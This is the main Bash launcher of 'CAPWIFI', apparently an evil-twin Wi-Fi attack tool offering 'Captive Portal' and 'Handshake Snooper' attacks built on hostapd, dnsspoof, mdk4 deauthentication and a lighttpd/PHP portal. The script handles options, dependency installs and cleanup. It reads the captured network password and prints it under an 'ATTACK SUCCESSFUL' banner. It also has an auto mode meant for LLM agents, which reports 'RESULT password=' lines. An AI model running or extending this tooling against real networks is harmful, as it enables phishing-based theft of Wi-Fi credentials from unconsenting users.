#!/usr/bin/env bash

# ============================================================ #
# ================== < CAPWIFI Parameters > ================== #
# ============================================================ #
# Path to the CAPWIFI executable script itself, and the directory containing it.
# Resolved once, up front, so it stays valid after the cd below and after any
# re-exec that relies on invoking this same script again.
readonly CAPCAPSelf=$(readlink -f "$0")
readonly CAPCAPPath=$(dirname "$CAPCAPSelf")

# Always run from the CAPWIFI directory; relative lookups (e.g. `ls language`) depend on it.
cd "$CAPCAPPath" || exit 1

# Path to directory containing the CAPWIFI library (scripts).
readonly CAPCAPLibPath="$CAPCAPPath/lib"

# Path to the temp. directory available to CAPWIFI & subscripts.
readonly CAPCAPWorkspacePath="${CAPCAPWorkspacePath:-/tmp/capcapspace}"
readonly CAPCAPIPTablesBackup="$CAPCAPPath/iptables-rules"

# Path to CAPCAP's preferences file, to be loaded afterward.
readonly CAPCAPPreferencesFile="${CAPCAPPreferencesFile:-$CAPCAPPath/preferences/preferences.conf}"

# Constants denoting the reference noise floor & ceiling levels.
# These are used by the the wireless network scanner visualizer.
readonly CAPCAPNoiseFloor=-90
readonly CAPCAPNoiseCeiling=-60

readonly CAPCAPVersion=6
readonly CAPCAPRevision=38

# Declare window ration bigger = smaller windows
CAPCAPWindowRatio=4

# Allow to skip dependencies if required, not recommended
CAPCAPSkipDependencies=1

# Check if there are any missing dependencies
CAPCAPMissingDependencies=0

# Install only the required packages and exit (used by the GUI on first run)
CAPCAPInstallDeps=0


# ============================================================ #
# ================= < Script Sanity Checks > ================= #
# ============================================================ #
# Pre-parse flags that must run before root/X11 checks.
CAPCAPPreParseTMux=""
CAPCAPPreParseScanOnly=""
CAPCAPPreParseListIfaces=""
CAPCAPPreParseInstallDeps=""
CAPCAPPreParseHelp=""
for arg in "$@"; do
  case "$arg" in
    -m|--multiplexer) CAPCAPPreParseTMux=1;;
    --scan-only) CAPCAPPreParseScanOnly=1;;
    --list-interfaces) CAPCAPPreParseListIfaces=1;;
    --install-deps) CAPCAPPreParseInstallDeps=1;;
    -h|--help|-v|--version) CAPCAPPreParseHelp=1;;
  esac
done

if [ $EUID -ne 0 ] && [ ! "$CAPCAPPreParseHelp" ] && [ ! "$CAPCAPPreParseListIfaces" ]; then
  echo -e "\\033[31mAborted, please execute the script as root.\\033[0m"; exit 1
fi

# ===================== < Platform Check > ===================== #
# The attack engine drives Linux-only tooling (hostapd, iptables, kea-dhcp4,
# dnsspoof, aircrack-ng). Failing here beats a confusing error from a missing
# package or from the BSD userland further down.
if [ "$(uname -s)" != "Linux" ]; then
  echo -e "\\033[31mAborted, capwifi requires Linux (Kali rolling is supported).\\033[0m"
  echo "Run it on a Linux host, or in a Kali VM/container."
  exit 1
fi

# Save original args for tmux re-exec.
readonly CAPCAPOriginalArgs=$(printf '%q ' "$@")

# If stdin is not a TTY (e.g., running from an LLM tool or CI) and we need
# tmux mode, re-exec under script(1) to allocate a pseudo-terminal.
if [ ! -t 0 ] && [ -z "$CAPCAP_HAS_PTY" ] && [ "$CAPCAPPreParseTMux" ] \
   && [ -z "$CAPCAPPreParseScanOnly" ] && [ -z "$CAPCAPPreParseListIfaces" ] \
   && [ -z "$CAPCAPPreParseInstallDeps" ] && [ -z "$CAPCAPPreParseHelp" ]; then
  export CAPCAP_HAS_PTY=1
  exec 3>&1
  exec script -qc "$CAPCAPSelf $CAPCAPOriginalArgs" /dev/null
fi

# ===================== < Display Checks > ===================== #
if [ "$CAPCAPPreParseScanOnly" ] || [ "$CAPCAPPreParseListIfaces" ] || [ "$CAPCAPPreParseInstallDeps" ] || [ "$CAPCAPPreParseHelp" ]; then
  # These modes don't need a display at all.
  :
elif [ "$CAPCAPPreParseTMux" ]; then
  # tmux mode: verify tmux is installed instead of X11.
  if ! hash tmux 2>/dev/null; then
    echo -e "\\033[31mAborted, tmux is not installed.\\033[0m"; exit 2
  fi
else
  if [ ! "${DISPLAY:-}" ] || ! hash xdpyinfo 2>/dev/null || ! xdpyinfo &>/dev/null; then
    # No usable X11 display — fall back to tmux mode automatically.
    if ! hash tmux 2>/dev/null; then
      echo -e "\\033[31mAborted, no display available and tmux is not installed.\\033[0m"; exit 2
    fi
    CAPCAPPreParseTMux=1
    # Allocate a PTY if stdin is not a terminal (LLM, CI, etc.).
    if [ ! -t 0 ] && [ -z "$CAPCAP_HAS_PTY" ]; then
      export CAPCAP_HAS_PTY=1
      exec 3>&1
      exec script -qc "$CAPCAPSelf $CAPCAPOriginalArgs" /dev/null
    fi
  fi
fi

# ================ < Parameter Parser Check > ================ #
getopt --test > /dev/null # Assure enhanced getopt (returns 4).
if [ $? -ne 4 ]; then
  echo "\\033[31mAborted, enhanced getopt isn't available.\\033[0m"; exit 5
fi

# =============== < Working Directory Check > ================ #
# The workspace holds the AP and DHCP configs, the captured credentials and
# the lighttpd document root, and CAPWIFI runs as root. A fixed path under
# /tmp is predictable: any local user can create it (or plant a symlink in
# its place) before CAPWIFI starts and end up controlling where root writes.
# Refuse symlinks, refuse a directory owned by somebody else, and force
# owner-only permissions.
if [ -L "$CAPCAPWorkspacePath" ]; then
  echo "\\033[31mAborted, workspace path is a symbolic link: $CAPCAPWorkspacePath\\033[0m"; exit 6
fi

if ! mkdir -p -m 0700 "$CAPCAPWorkspacePath" &> /dev/null; then
  echo "\\033[31mAborted, can't generate a workspace directory.\\033[0m"; exit 6
fi

if [ ! -d "$CAPCAPWorkspacePath" ] || [ -L "$CAPCAPWorkspacePath" ]; then
  echo "\\033[31mAborted, workspace path is not a plain directory: $CAPCAPWorkspacePath\\033[0m"; exit 6
fi

__capcapWorkspaceOwner="$(stat -c '%u' -- "$CAPCAPWorkspacePath" 2>/dev/null || true)"
if [ "$__capcapWorkspaceOwner" ] && [ "$__capcapWorkspaceOwner" != "$EUID" ]; then
  echo "\\033[31mAborted, workspace directory is owned by uid $__capcapWorkspaceOwner, not $EUID.\\033[0m"
  echo "Remove it and rerun: rm -rf -- '$CAPCAPWorkspacePath'"
  exit 7
fi
unset __capcapWorkspaceOwner

# A directory left behind by an earlier run may carry looser permissions.
chmod 0700 -- "$CAPCAPWorkspacePath" &> /dev/null

# Once sanity check is passed, we can start to load everything.

# ============================================================ #
# =================== < Library Includes > =================== #
# ============================================================ #
source "$CAPCAPLibPath/installer/InstallerUtils.sh"
source "$CAPCAPLibPath/InterfaceUtils.sh"
source "$CAPCAPLibPath/SandboxUtils.sh"
source "$CAPCAPLibPath/FormatUtils.sh"
source "$CAPCAPLibPath/ColorUtils.sh"
source "$CAPCAPLibPath/IOUtils.sh"
source "$CAPCAPLibPath/HashUtils.sh"
source "$CAPCAPLibPath/HelpUtils.sh"
source "$CAPCAPLibPath/WindowUtils.sh"

# NOTE: These are configured after arguments are loaded (later).

# Write a clean timestamped status line for machine consumption (LLM, CI).
# In auto mode: appends to $CAPCAPWorkspacePath/capcap.status and writes to fd 3
# (the original stdout preserved before the script(1) PTY wrapper).
# In interactive mode: no-op.
capcap_status() {
  [ "$CAPCAPAuto" ] || return 0
  local ts=$(date '+%Y-%m-%dT%H:%M:%S')
  local msg="[$ts] $*"
  echo "$msg" >> "$CAPCAPWorkspacePath/capcap.status" 2>/dev/null
  if { true >&3; } 2>/dev/null; then
    echo "$msg" >&3
  fi
}

# ============================================================ #
# =================== < Parse Parameters > =================== #
# ============================================================ #
if ! CAPCAPCLIArguments=$(
    getopt --options="vdkrinmthb:e:c:l:a:r" \
      --longoptions="debug,debug-log:,version,killer,installer,reloader,help,airmon-ng,multiplexer,target,test,auto,bssid:,essid:,channel:,language:,attack:,ratio,skip-dependencies,scan-time:,scan-only,list-interfaces,install-deps,interface:,jammer-interface:,ap-interface:,ap-channel:,tracker-interface:,ap-service:,deauth-method:,site:,kill-exclude:,timeout:,reg-domain:,band:" \
      --name="CAPWIFI V$CAPCAPVersion.$CAPCAPRevision" -- "$@"
  ); then
  echo -e "${CRed}Aborted$CClr, parameter error detected..."; exit 5
fi

AttackCLIArguments=${CAPCAPCLIArguments##* -- }
readonly CAPCAPCLIArguments=${CAPCAPCLIArguments%%-- *}
if [ "$AttackCLIArguments" = "$CAPCAPCLIArguments" ]; then
  AttackCLIArguments=""
fi


# ============================================================ #
# ================== < Load Configurables > ================== #
# ============================================================ #

# ============= < Argument Loaded Configurables > ============ #
eval set -- "$CAPCAPCLIArguments" # Set environment parameters.

#[ "$1" != "--" ] && readonly CAPCAPAuto=1 # Auto-mode if using CLI.
while [ "$1" != "" ] && [ "$1" != "--" ]; do
  case "$1" in
    -v|--version) echo "CAPWIFI V$CAPCAPVersion.$CAPCAPRevision"; exit;;
    -h|--help) capcap_help; exit;;
    -d|--debug) readonly CAPCAPDebug=1;;
    --debug-log) CAPCAPDebugLog="$2"; shift;;
    -k|--killer) readonly CAPCAPWIKillProcesses=1;;
    -r|--reloader) readonly CAPCAPWIReloadDriver=1;;
    -n|--airmon-ng) readonly CAPCAPAirmonNG=1;;
    -m|--multiplexer) readonly CAPCAPTMux=1;;
    -b|--bssid) CapCapTargetMAC=$2; shift;;
    -e|--essid) CapCapTargetSSID=$2;
      # TODO: Rearrange declarations to have routines available for use here.
      CapCapTargetSSIDClean=$(echo "$CapCapTargetSSID" | sed -r 's/( |\/|\.|\~|\\)+/_/g'); shift;;
    -c|--channel) CapCapTargetChannel=$2; shift;;
    -l|--language) CapCapLanguage=$2; shift;;
    -a|--attack)
      CapCapAttack=$2
      case "${CapCapAttack,,}" in
        captive*|*portal*) CapCapAttack="Captive Portal";;
        handshake*|*snooper*) CapCapAttack="Handshake Snooper";;
      esac
      shift;;
    -i|--install) CAPCAPSkipDependencies=0; shift;;
    --ratio) CAPCAPWindowRatio=$2; shift;;
    --auto) readonly CAPCAPAuto=1;;
    --scan-time) CAPCAPScanTime=$2; shift;;
    --scan-only) readonly CAPCAPScanOnly=1;;
    --list-interfaces) CAPCAPListInterfaces=1;;
    --install-deps) CAPCAPInstallDeps=1;;
    --interface) CAPCAPInterface=$2; shift;;
    --skip-dependencies) readonly CAPCAPSkipDependencies=1;;
    --jammer-interface) CAPCAPJammerInterface=$2; shift;;
    --ap-interface) CAPCAPAPInterface=$2; shift;;
    --ap-channel) CAPCAPAPChannel=$2; shift;;
    --tracker-interface) CAPCAPTrackerInterface=$2; shift;;
    --ap-service) CAPCAPAPService=$2; shift;;
    --deauth-method) CAPCAPDeauthMethod=$2; shift;;
    --site) CAPCAPUserInterface=$2; shift;;
    --kill-exclude) CAPCAPKillExclude=$2; shift;;
    --timeout) CAPCAPTimeout=$2; shift;;
    --reg-domain) CAPCAPRegDomain=${2^^}; shift;;
    --band) CAPCAPBand=$2; shift;;
  esac
  shift # Shift new parameters
done

# Propagate no-display tmux fallback (set during pre-parse) into CAPCAPTMux.
if [ "$CAPCAPPreParseTMux" ] && [ "$CAPCAPTMux" != "1" ]; then
  readonly CAPCAPTMux=1
fi

# Default scan time for auto mode.
if [ -z "$CAPCAPScanTime" ]; then
  CAPCAPScanTime=30
fi

# Scan-only mode implies auto + killer.
if [ "$CAPCAPScanOnly" ]; then
  if [ "$CAPCAPAuto" != "1" ]; then
    readonly CAPCAPAuto=1
  fi
fi

# Auto mode implies killer mode (can't prompt user about interfering processes).
if [ "$CAPCAPAuto" ] && [ "$CAPCAPWIKillProcesses" != "1" ]; then
  readonly CAPCAPWIKillProcesses=1
fi

shift # Remove "--" to prepare for attacks to read parameters.
# Executable arguments are handled after subroutine definition.

# =================== < User Preferences > =================== #
# Load user-defined preferences if there's an executable script.
# If no script exists, prepare one for the user to store config.
# WARNING: Preferences file must assure no redeclared constants.
if [ $EUID -eq 0 ]; then
  if [ -x "$CAPCAPPreferencesFile" ]; then
    source "$CAPCAPPreferencesFile"
  else
    echo '#!/usr/bin/env bash' > "$CAPCAPPreferencesFile"
    chmod u+x "$CAPCAPPreferencesFile"
  fi
fi

# ================ < Configurable Constants > ================ #
if [ "$CAPCAPAuto" != "1" ]; then # If defined, assure 1.
  readonly CAPCAPAuto=${CAPCAPAuto:+1}
fi

if [ "$CAPCAPDebug" != "1" ]; then # If defined, assure 1.
  readonly CAPCAPDebug=${CAPCAPDebug:+1}
fi

if [ "$CAPCAPAirmonNG" != "1" ]; then # If defined, assure 1.
  readonly CAPCAPAirmonNG=${CAPCAPAirmonNG:+1}
fi

if [ "$CAPCAPWIKillProcesses" != "1" ]; then # If defined, assure 1.
  readonly CAPCAPWIKillProcesses=${CAPCAPWIKillProcesses:+1}
fi

if [ "$CAPCAPWIReloadDriver" != "1" ]; then # If defined, assure 1.
  readonly CAPCAPWIReloadDriver=${CAPCAPWIReloadDriver:+1}
fi

# CAPCAPDebug [Normal Mode "" / Developer Mode 1]
if [ $CAPCAPDebug ]; then
  # Use custom debug log path if specified, otherwise default to /tmp
  if [ -z "$CAPCAPDebugLog" ]; then
    CAPCAPDebugLog="/tmp/capcap.debug.log"
  fi
  :> "$CAPCAPDebugLog"
  readonly CAPCAPOutputDevice="$CAPCAPDebugLog"
  readonly CAPCAPHoldXterm="-hold"
  echo "Debug log: $CAPCAPDebugLog"
else
  readonly CAPCAPOutputDevice=/dev/null
  readonly CAPCAPHoldXterm=""
fi

# Initialize window system (xterm or tmux).
capcap_window_init

# Truncate status file for clean auto-mode progress reporting.
[ "$CAPCAPAuto" ] && : > "$CAPCAPWorkspacePath/capcap.status" 2>/dev/null

# ================ < Configurable Variables > ================ #
readonly CAPCAPPromptDefault="$CRed[${CSBlu}capcap$CSYel@$CSWht$HOSTNAME$CClr$CRed]-[$CSYel~$CClr$CRed]$CClr "
CAPCAPPrompt=$CAPCAPPromptDefault

readonly CAPCAPVLineDefault="$CRed[$CSYel*$CClr$CRed]$CClr"
CAPCAPVLine=$CAPCAPVLineDefault

# ================== < Library Parameters > ================== #
readonly InterfaceUtilsOutputDevice="$CAPCAPOutputDevice"

readonly SandboxWorkspacePath="$CAPCAPWorkspacePath"
readonly SandboxOutputDevice="$CAPCAPOutputDevice"

readonly InstallerUtilsWorkspacePath="$CAPCAPWorkspacePath"
readonly InstallerUtilsOutputDevice="$CAPCAPOutputDevice"
readonly InstallerUtilsNoticeMark="$CAPCAPVLine"

readonly PackageManagerLog="$InstallerUtilsWorkspacePath/package_manager.log"

declare  IOUtilsHeader="capcap_header"
readonly IOUtilsQueryMark="$CAPCAPVLine"
readonly IOUtilsPrompt="$CAPCAPPrompt"

readonly HashOutputDevice="$CAPCAPOutputDevice"

# ============================================================ #
# =================== < Default Language > =================== #
# ============================================================ #
# Set by default in case capcap is aborted before setting one.
source "$CAPCAPPath/language/en.sh"

# ============================================================ #
# ================== < Startup & Shutdown > ================== #
# ============================================================ #

# Detect AppArmor-confined tools and add workspace access rules so capcap
# can use them with its own config/data files in CAPCAPWorkspacePath.
# This is idempotent: rules already containing the workspace path are skipped.
capcap_configure_apparmor() {
  # AppArmor must be present and manageable.
  [ -d /sys/kernel/security/apparmor ] || return 0
  [ -d /etc/apparmor.d/local ] || return 0
  hash apparmor_parser 2>/dev/null || return 0

  local changed=0

  # kea-dhcp4: needs read access to config file and rw+link access to lease file.
  local keaProfile="/etc/apparmor.d/usr.sbin.kea-dhcp4"
  local keaLocal="/etc/apparmor.d/local/usr.sbin.kea-dhcp4"
  if [ -f "$keaProfile" ] && ! grep -qF "$CAPCAPWorkspacePath" "$keaLocal" 2>/dev/null; then
    printf '# Allow capcap workspace access (added by capcap)\n%s/ r,\n%s/** rwl,\n' \
      "$CAPCAPWorkspacePath" "$CAPCAPWorkspacePath" >> "$keaLocal"
    apparmor_parser -r "$keaProfile" &>/dev/null
    changed=1
  fi

  if [ "$changed" = "1" ]; then
    echo -e "$CAPCAPVLine AppArmor profiles updated for capcap workspace."
  fi
}

capcap_startup() {
  if [ "$CAPCAPDebug" ]; then return 1; fi

  # Make sure that we save the iptable files
  iptables-save >"$CAPCAPIPTablesBackup"
  local banner=()

  format_center_literals \
    "  ___   _   ___  ___   _   _____      _____ ___ ___"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    " / __| /_\ | _ \/ __| /_\ | _ \ \    / /_ _| __|_ _|"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    "| (__ / _ \|  _/ (__ / _ \|  _/\ \/\/ / | || _| | |"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    " \___/_/ \_\_|  \___/_/ \_\_|   \_/\_/ |___|_| |___|"
  banner+=("$FormatCenterLiterals")
  clear

  if [ "$CAPCAPAuto" ]; then echo -e "$CBlu"; else echo -e "$CRed"; fi

  for line in "${banner[@]}"; do
    echo "$line"; sleep 0.05
  done

  echo # Do not remove.

  sleep 0.1
  local -r projectRepository="https://github.com/sametuca/capwifi"
  format_center_literals "${CGrn}Site: ${CRed}$projectRepository$CClr"
  echo -e "$FormatCenterLiterals"

  sleep 0.1
  local -r versionInfo="${CSRed}CAPWIFI $CAPCAPVersion$CClr"
  local -r revisionInfo="(rev. $CSBlu$CAPCAPRevision$CClr)"
  local -r credits="by$CCyn sametuca$CClr"
  format_center_literals "$versionInfo $revisionInfo $credits"
  echo -e "$FormatCenterLiterals"

  sleep 0.1
  if [ ! "$CAPCAPAuto" ]; then
    local -r updateRawDomain="raw.githubusercontent.com"
    local -r updateRawPath="sametuca/capwifi/master/capwifi.sh"
    local -r updateZipDomain="github.com"
    local -r updateZipPath="sametuca/capwifi/archive/master.zip"
    if installer_utils_check_update "https://$updateRawDomain/$updateRawPath" \
      "CAPCAPVersion=" "CAPCAPRevision=" \
      $CAPCAPVersion $CAPCAPRevision; then
      if installer_utils_run_update "https://$updateZipDomain/$updateZipPath" \
        "CAPWIFI-V$CAPCAPVersion.$CAPCAPRevision" "$CAPCAPPath"; then
        capcap_shutdown
      fi
    fi
  fi

  echo # Do not remove.

  if ! capcap_configure_dependencies; then
    echo -e "${CRed}Required packages are missing; cannot continue.$CClr}"
    exit 7
  fi

  # lighttpd's package auto-enables the system service on install; disable it
  # so it doesn't occupy port 80 or conflict with capcap's own instance.
  if hash lighttpd 2>/dev/null && hash systemctl 2>/dev/null; then
    systemctl stop lighttpd &>/dev/null || true
    systemctl disable lighttpd &>/dev/null || true
  fi

  capcap_configure_apparmor

  echo -e "\\n\\n" # This echo is for spacing
}

# Check every tool the attacks need and install whatever is missing.
# Runs both from capcap_startup and from `--install-deps` (the GUI's first
# launch), so it must not depend on the banner or on any attack state.
# Emits DEP_* status lines in --auto mode so a front-end can show progress.
capcap_configure_dependencies() {
  local requiredCLITools=(
    "aircrack-ng" "bc" "awk:awk|gawk|mawk"
    "curl" "cowpatty" "kea-dhcp4:kea-dhcp4-server|kea" "7zr:7zip-reduced|p7zip" "hostapd" "lighttpd"
    "iw" "macchanger" "mdk4" "dsniff" "nmap" "openssl"
    "php-cgi" "rfkill" "unzip" "route:net-tools"
    "fuser:psmisc" "killall:psmisc"
    "iptables" "iptables-save:iptables" "iptables-restore:iptables"
  )

  # Add display-mode-specific dependency. Headless runs (scan-only) need no
  # terminal emulator at all; `--install-deps` prepares the tmux stack the GUI
  # uses for attacks, so it must not pull xterm on a tmux-only machine.
  case "$CAPCAPDisplayMode" in
    tmux) requiredCLITools+=("tmux");;
    xterm) requiredCLITools+=("xterm");;
  esac
  if [ "$CAPCAPDisplayMode" = "headless" ] && [ "1" = "$CAPCAPInstallDeps" ]; then
    requiredCLITools+=("tmux")
  fi

  capcap_status "DEP_CHECK start"

  local depRetryCount=0
  while ! installer_utils_check_dependencies requiredCLITools[@]; do
    if [ ${#InstallerUtilsCheckDependencies[@]} -gt 0 ]; then
      local missingList=""
      local missingItem
      for missingItem in "${InstallerUtilsCheckDependencies[@]}"; do
        missingList+="${missingItem/:*/} "
      done
      capcap_status "DEP_MISSING tools=${missingList% }"
    fi

    if ! installer_utils_run_dependencies InstallerUtilsCheckDependencies[@]; then
      echo
      echo -e "${CRed}Dependency installation failed!$CClr"
      capcap_status "DEP_FAILED"
      if [ "$CAPCAPAuto" ]; then
        depRetryCount=$((depRetryCount + 1))
        if [ $depRetryCount -ge 2 ]; then
          echo -e "${CRed}Auto mode: dependency install failed after retry, exiting.$CClr"
          return 1
        fi
        echo "Auto mode: retrying dependency install..."
        sleep 2
      else
        echo "Press enter to retry, ctrl+c to exit..."
        read -r bullshit
      fi
    fi
  done

  if [ $CAPCAPMissingDependencies -eq 1 ] && [ $CAPCAPSkipDependencies -eq 1 ]; then
    echo -e "\n\n"
    format_center_literals "[ ${CSRed}Missing dependencies: try to install using ./capwifi.sh -i${CClr} ]"
    echo -e "$FormatCenterLiterals"; sleep 3

    capcap_status "DEP_FAILED"
    return 1
  fi

  capcap_status "DEP_OK"
  return 0
}

capcap_shutdown() {
  # Close the clean-output fd if it was opened for the script(1) PTY wrapper.
  { exec 3>&-; } 2>/dev/null

  # Clean up any tmux windows we created.
  if type -t capcap_window_cleanup &> /dev/null; then
    capcap_window_cleanup
  fi

  # Show the header if the subroutine has already been loaded (CLI only).
  if [ -z "$CAPCAPAuto" ]; then
    if type -t capcap_header &> /dev/null; then
      capcap_header
    fi

    echo -e "$CWht[$CRed-$CWht]$CRed $CAPCAPCleanupAndClosingNotice$CClr"
  fi

  # Get running processes we might have to kill before exiting.
  local processes
  readarray processes < <(ps -A)

  # Currently, capcap is only responsible for killing airodump-ng, since
  # capcap explicitly uses it to scan for candidate target access points.
  # NOTICE: Processes started by subscripts, such as an attack script,
  # MUST BE TERMINATED BY THAT SCRIPT in the subscript's abort handler.
  local -r targets=("airodump-ng")

  local targetID # Program identifier/title
  for targetID in "${targets[@]}"; do
    # Get PIDs of all programs matching targetPID
    local targetPID
    targetPID=$(
      echo "${processes[@]}" | awk '$4~/'"$targetID"'/{print $1}'
    )
    if [ ! "$targetPID" ]; then continue; fi
    echo -e "$CWht[$CRed-$CWht] `io_dynamic_output $CAPCAPKillingProcessNotice`"
    kill -s SIGKILL $targetPID &>> $CAPCAPOutputDevice
  done
  kill -s SIGKILL $authService &>> $CAPCAPOutputDevice

  # Assure changes are reverted if installer was activated.
  if [ "$PackageManagerCLT" ]; then
    echo -e "$CWht[$CRed-$CWht] "$(
      io_dynamic_output "$CAPCAPRestoringPackageManagerNotice"
    )"$CClr"
    # Notice: The package manager has already been restored at this point.
    # InstallerUtils assures the manager is restored after running operations.
  fi

  # If allocated interfaces exist, deallocate them now.
  if [ ${#CapCapInterfaces[@]} -gt 0 ]; then
    local interface
    for interface in "${!CapCapInterfaces[@]}"; do
      # Only deallocate capwifi or airmon-ng created interfaces.
      if [[ "$interface" == "capwl"* || "$interface" == "capet"* || "$interface" == *"mon"* || "$interface" == "prism"* ]]; then
        capcap_deallocate_interface "$interface"
      fi
    done
  fi

  echo -e "$CWht[$CRed-$CWht] $CAPCAPDisablingCleaningIPTablesNotice$CClr"
  if [ -f "$CAPCAPIPTablesBackup" ]; then
    iptables-restore <"$CAPCAPIPTablesBackup" \
      &>> $CAPCAPOutputDevice
    rm -f "$CAPCAPIPTablesBackup"
  else
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
  fi

  echo -e "$CWht[$CRed-$CWht] $CAPCAPRestoringTputNotice$CClr"
  tput cnorm

  if [ ! $CAPCAPDebug ]; then
    echo -e "$CWht[$CRed-$CWht] $CAPCAPDeletingFilesNotice$CClr"
    sandbox_remove_workfile "$CAPCAPWorkspacePath/*"
  fi

  if [ $CAPCAPWIKillProcesses ]; then
    echo -e "$CWht[$CRed-$CWht] $CAPCAPRestartingNetworkManagerNotice$CClr"

    # TODO: Add support for other network managers (wpa_supplicant?).
    if [ ! -x "$(command -v systemctl)" ]; then
        if [ -x "$(command -v service)" ];then
        service network-manager restart &>> $CAPCAPOutputDevice &
        service networkmanager restart &>> $CAPCAPOutputDevice &
        service networking restart &>> $CAPCAPOutputDevice &
      fi
    else
      systemctl restart network-manager.service &>> $CAPCAPOutputDevice &
    fi
  fi

  echo -e "$CWht[$CGrn+$CWht] $CGrn$CAPCAPCleanupSuccessNotice$CClr"

  if [ -z "$CAPCAPAuto" ]; then
    echo -e "$CWht[$CGrn+$CWht] $CGry$CAPCAPThanksSupportersNotice$CClr"
    sleep 3
    clear
  fi

  exit 0
}


# ============================================================ #
# ================== < Helper Subroutines > ================== #
# ============================================================ #
# The following will kill the parent proces & all its children.
capcap_kill_lineage() {
  if [ ${#@} -lt 1 ]; then return -1; fi

  if [ ! -z "$2" ]; then
    local -r options=$1
    local match=$2
  else
    local -r options=""
    local match=$1
  fi

  # Check if the match isn't a number, but a regular expression.
  # The following might
  if ! [[ "$match" =~ ^[0-9]+$ ]]; then
    match=$(pgrep -f $match 2>> $CAPCAPOutputDevice)
  fi

  # Check if we've got something to kill, abort otherwise.
  if [ -z "$match" ]; then return -2; fi

  kill $options $(pgrep -P $match 2>> $CAPCAPOutputDevice) \
    &>> $CAPCAPOutputDevice
  kill $options $match &>> $CAPCAPOutputDevice
}


# ============================================================ #
# ================= < Handler Subroutines > ================== #
# ============================================================ #
# Delete log only in Normal Mode !
capcap_conditional_clear() {
  # Clear if we're not in debug mode
  if [ ! $CAPCAPDebug ]; then clear; fi
}

capcap_conditional_bail() {
  local bailReason="${1:-"Something went wrong, whoops! (report this)"}"
  echo "$bailReason"
  # GUI'ye nedeni söyle: kullanıcı "kendi kendine kapandı" yerine ne olduğunu
  # görsün. Boşluklu metin sonda olduğu için ayrıştırıcı onu tek parça alır.
  capcap_status "ATTACK_FAILED reason=$bailReason"
  sleep 5
  if [ ! $CAPCAPDebug ]; then
    capcap_handle_exit
    return 1
  fi
  if [ "$CAPCAPAuto" ]; then return 0; fi
  echo "Press any key to continue execution..."
  read -r bullshit
}

# ERROR Report only in Developer Mode
if [ $CAPCAPDebug ]; then
  capcap_error_report() {
    echo "Exception caught @ line #$1"
  }

  trap 'capcap_error_report $LINENO' ERR
fi

capcap_handle_abort_attack() {
  if [ $(type -t stop_attack) ]; then
    stop_attack &>> $CAPCAPOutputDevice
    unprep_attack &>> $CAPCAPOutputDevice
  else
    echo "Attack undefined, can't stop anything..." >> $CAPCAPOutputDevice
  fi

  capcap_target_tracker_stop
}

# In case of abort signal, abort any attacks currently running.
trap capcap_handle_abort_attack SIGABRT

capcap_handle_exit() {
  # Read success state NOW, before capcap_handle_abort_attack or
  # capcap_shutdown touch the workspace. Note: capcap_shutdown calls
  # exit 0 itself so nothing after it ever runs.
  local _successPassword=""
  local _successSSID="$CapCapTargetSSID"
  local _successMAC="$CapCapTargetMAC"
  if [ -f "$CAPCAPWorkspacePath/status.txt" ] && \
     [ -f "$CAPCAPWorkspacePath/candidate.txt" ]; then
    _successPassword=$(cat "$CAPCAPWorkspacePath/candidate.txt" 2>/dev/null)
  fi

  capcap_handle_abort_attack

  # Show success banner BEFORE capcap_shutdown clears the screen and exits.
  if [ -n "$_successPassword" ]; then
    local _logFile=""
    if [ -n "${CaptivePortalNetLog:-}" ]; then
      _logFile=$(ls -t "$CaptivePortalNetLog"/*"$_successMAC"* 2>/dev/null | head -1)
    fi

    tput cnorm 2>/dev/null
    clear
    echo
    echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
    echo -e "  ${CSGrn}|           ATTACK SUCCESSFUL                   |${CClr}"
    echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
    echo -e "  ${CGrn}  Network  :${CClr} ${CSWht}$_successSSID${CClr}"
    echo -e "  ${CGrn}  BSSID    :${CClr} ${CSWht}$_successMAC${CClr}"
    echo -e "  ${CYel}  Password :${CClr} ${CSYel}$_successPassword${CClr}"
    if [ -n "$_logFile" ]; then
      echo -e "  ${CGrn}  Log      :${CClr} ${CSWht}$_logFile${CClr}"
    fi
    echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
    echo
    if [ -z "${CAPCAPAuto:-}" ]; then
      read -rp "  Press Enter to clean up and exit... " _
      echo
    else
      sleep 10
    fi
  fi

  # Report final result for machine consumption (LLM, CI).
  if [ "$CAPCAPAuto" ]; then
    local _hsFile="$CAPCAPPath/attacks/Handshake Snooper/handshakes/${CapCapTargetSSIDClean}-${CapCapTargetMAC}.cap"
    if [ -n "$_successPassword" ]; then
      capcap_status "RESULT password=$_successPassword ssid=$_successSSID bssid=$_successMAC"
    elif [ -f "$_hsFile" ]; then
      capcap_status "RESULT handshake=$_hsFile ssid=$_successSSID bssid=$_successMAC"
    else
      capcap_status "RESULT none"
    fi
  fi

  capcap_shutdown
}

# In case of unexpected termination, run capcap_shutdown.
trap capcap_handle_exit SIGINT SIGHUP


capcap_handle_target_change() {
  echo "Target change signal received!" >> $CAPCAPOutputDevice

  local targetInfo
  readarray -t targetInfo < "$CAPCAPWorkspacePath/target_info.txt"

  CapCapTargetMAC=${targetInfo[0]}
  CapCapTargetSSID=${targetInfo[1]}
  CapCapTargetChannel=${targetInfo[2]}

  CapCapTargetSSIDClean=$(capcap_target_normalize_SSID)

  if ! stop_attack; then
    capcap_conditional_bail "Target tracker failed to stop attack."
  fi

  if ! unprep_attack; then
    capcap_conditional_bail "Target tracker failed to unprep attack."
  fi

  if ! load_attack "$CAPCAPPath/attacks/$CapCapAttack/attack.conf"; then
    capcap_conditional_bail "Target tracker failed to load attack."
  fi

  if ! prep_attack; then
    capcap_conditional_bail "Target tracker failed to prep attack."
  fi

  # Restart attack services and tracker without blocking on user input.
  # NOTE: Do NOT call capcap_run_attack here as it blocks on io_query_choice.
  start_attack
  capcap_target_tracker_start
}

# If target monitoring enabled, act on changes.
trap capcap_handle_target_change SIGALRM

capcap_handle_target_absent() {
  echo "Target absent signal received." >> $CAPCAPOutputDevice
  if [ "$(type -t pause_attack)" = "function" ]; then
    pause_attack &>> $CAPCAPOutputDevice
  fi
}

capcap_handle_target_present() {
  echo "Target present signal received." >> $CAPCAPOutputDevice
  if [ "$(type -t resume_attack)" = "function" ]; then
    resume_attack &>> $CAPCAPOutputDevice
  fi
}

